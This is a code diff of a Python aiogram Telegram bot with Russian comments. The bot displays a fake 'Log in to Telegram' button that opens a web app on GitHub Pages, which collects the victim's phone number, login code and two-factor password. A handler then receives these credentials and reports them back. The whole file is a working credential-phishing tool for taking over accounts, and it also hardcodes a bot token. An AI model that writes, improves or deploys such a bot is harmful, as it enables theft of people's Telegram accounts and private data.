@@ -3,101 +3,107 @@ import logging
 import json
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import Command
-from aiogram.types import (
-    WebAppInfo,
-    ReplyKeyboardMarkup,
-    KeyboardButton  # <--- ВАЖНО: Используем обычную кнопку, а не Inline
-)
+from aiogram.types import WebAppInfo, ReplyKeyboardMarkup, KeyboardButton
 
 # ==========================================
-# 👇 НАСТРОЙКИ 👇
+# 👇 НАСТРОЙКИ (ЗАПОЛНИ ИХ) 👇
 # ==========================================
+
+# 1. Твой токен от @BotFather
 BOT_TOKEN = "8563110236:AAEO8GlnHVxtsMjbaiQ-EuHq7hphAaMzXL0"
-WEB_APP_URL = "https://vanchopiki.github.io/test/"
+
+# 2. Ссылка на твой сайт с GitHub
+# Важно: Добавь в конец ?v=любое_число, чтобы сбросить кеш в телефоне!
+WEB_APP_URL = "https://vanchopiki.github.io/test/index.html?v=404"
+
 # ==========================================
 
+# Включаем логирование, чтобы видеть сообщения в консоли PyCharm
 logging.basicConfig(level=logging.INFO)
 
+# Создаем объекты бота
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
 
-# --- ОТПРАВКА КНОПКИ ---
-async def send_login_button(message: types.Message, need_password: bool):
-    # Формируем ссылку
-    if need_password:
-        final_url = f"{WEB_APP_URL}?p=1"
-        text_msg = "🔐 Включен режим: <b>С ПАРОЛЕМ</b>\nНажми кнопку <b>ВНИЗУ</b> экрана 👇"
-    else:
-        final_url = WEB_APP_URL
-        text_msg = "📱 Включен режим: <b>ОБЫЧНЫЙ</b>\nНажми кнопку <b>ВНИЗУ</b> экрана 👇"
+# --- ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ---
+# Она решает, какую ссылку дать: обычную или с требованием пароля
+async def send_ui(message: types.Message, need_pass: bool):
+    url = WEB_APP_URL
 
-    # ВАЖНО: Создаем клавиатуру для НИЖНЕГО меню
-    keyboard = ReplyKeyboardMarkup(
+    if need_pass:
+        # Если нужен пароль, добавляем параметр p=1 к ссылке
+        # Проверяем, какой разделитель использовать (? или &)
+        separator = "&" if "?" in WEB_APP_URL else "?"
+        url = f"{WEB_APP_URL}{separator}p=1"
+        txt = "🔐 <b>Вход с ПАРОЛЕМ</b> (2FA)\nНажми кнопку внизу 👇"
+    else:
+        # Если пароль не нужен
+        txt = "📱 <b>Обычный вход</b>\nНажми кнопку внизу 👇"
+
+    # Создаем кнопку, которая появится вместо клавиатуры
+    kb = ReplyKeyboardMarkup(
         keyboard=[
             [
                 KeyboardButton(
                     text="⚡ Войти в Telegram",
-                    web_app=WebAppInfo(url=final_url)
+                    web_app=WebAppInfo(url=url)
                 )
             ]
         ],
-        resize_keyboard=True,  # Кнопка будет аккуратной
-        one_time_keyboard=False
+        resize_keyboard=True,
+        input_field_placeholder="Нажми кнопку ниже..."
     )
 
-    await message.answer(text_msg, reply_markup=keyboard, parse_mode="HTML")
+    await message.answer(txt, reply_markup=kb, parse_mode="HTML")
 
 
-# 1. Если пишут "пароль"
+# 1. Если написали слово "пароль" -> Включаем режим с паролем
 @dp.message(F.text.lower() == "пароль")
-async def password_mode(message: types.Message):
-    await send_login_button(message, need_password=True)
+async def mode_pass(message: types.Message):
+    await send_ui(message, True)
 
 
-# 2. Команда /start и всё остальное
+# 2. Если нажали /start или написали что-то другое -> Обычный режим
 @dp.message(Command("start"))
 @dp.message()
-async def default_mode(message: types.Message):
-    await send_login_button(message, need_password=False)
+async def mode_default(message: types.Message):
+    await send_ui(message, False)
 
 
-# 3. ЛОВИМ ДАННЫЕ ОТ САЙТА
-# Этот хендлер сработает, когда сайт выполнит tg.sendData()
+# 3. ПОЛУЧЕНИЕ ДАННЫХ ОТ САЙТА
+# Сработает, когда сайт выполнит tg.sendData()
 @dp.message(F.web_app_data)
-async def get_web_app_data(message: types.Message):
-    print(f"Пришли данные: {message.web_app_data.data}")  # Пишем в консоль PyCharm для проверки
-
+async def data_handler(message: types.Message):
     try:
+        # Получаем данные из веб-приложения
         data = json.loads(message.web_app_data.data)
 
-        phone = data.get('phone', '—')
-        code = data.get('code', '—')
+        # Достаем поля
+        phone = data.get('phone', '-')
+        code = data.get('code', '-')
         password = data.get('password', '')
 
+        # Если пароль пустой, пишем красиво
         if not password:
             password = "<i>(Не введен)</i>"
 
-        text = (
-            "✅ <b>ДАННЫЕ ПОЛУЧЕНЫ!</b>\n\n"
-            f"📞 <b>Телефон:</b> <code>{phone}</code>\n"
-            f"🔢 <b>Код:</b> <code>{code}</code>\n"
-            f"🔑 <b>Пароль:</b> <code>{password}</code>"
+        # Отправляем тебе результат
+        await message.answer(
+            f"✅ <b>ДАННЫЕ ПОЛУЧЕНЫ:</b>\n\n"
+            f"📞 Телефон: <code>{phone}</code>\n"
+            f"🔢 Код: <code>{code}</code>\n"
+            f"🔑 Пароль: <code>{password}</code>",
+            parse_mode="HTML"
         )
-
-        await message.answer(text, parse_mode="HTML")
-
     except Exception as e:
         await message.answer(f"Ошибка чтения данных: {e}")
 
 
-async def main():
-    print("Бот запущен!")
-    await dp.start_polling(bot)
-
-
+# Запуск бота
 if __name__ == "__main__":
     try:
-        asyncio.run(main())
+        print("Бот запущен!")
+        asyncio.run(dp.start_polling(bot))
     except KeyboardInterrupt:
-        print("Стоп.")
+        print("Бот выключен.")
